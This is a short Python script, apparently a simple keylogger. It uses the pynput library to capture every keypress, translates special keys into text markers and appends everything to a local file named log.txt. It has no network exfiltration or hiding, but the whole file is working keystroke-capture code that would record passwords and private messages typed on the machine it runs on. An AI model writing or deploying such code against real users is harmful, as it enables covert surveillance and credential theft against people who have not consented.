from pynput.keyboard import Listener

def press(key):

    data=str(key)
    data=data.replace("'","")

    if data=="Key.space":
        data=" "
    elif data=="Key.enter":
        data="\n"
    elif data=="Key.shift_r" or data=="Key.shift_l" or data=="Key.shift":
        data=""
    elif data=="Key.tab":
        data="/--tab--/"
    elif data=="Key.caps_lock":
        data=""
    elif data=="Key.cmd":
        data="/--windowbutton--/"
    elif data=="Key.esc":
        data="/--esc--/"
    elif data=="Key.delete":
        data="(->)"
    elif data=="Key.backspace":
       data="(<-)"
    elif data=="Key.up":
        data="/--up--/"
    elif data=="Key.down":
        data="/--down--/"
    elif data=="Key.left":
        data="/--left--/"
    elif data=="Key.right":
        data="/--right--/"
    elif data=="Key.page_up":
        data="/--page_up--/"
    elif data=="Key.page_down":
        data="/--pagedown--/"
    elif data=="Key.alt_l" or data=="Key.alt_r":
        data=""
    elif data=="Key.ctrl_l" or data=="key.ctrl_r":
        data=""

    with open("log.txt","a") as f:
        f.write(data)

    

with Listener(on_press=press) as l:
    l.join()
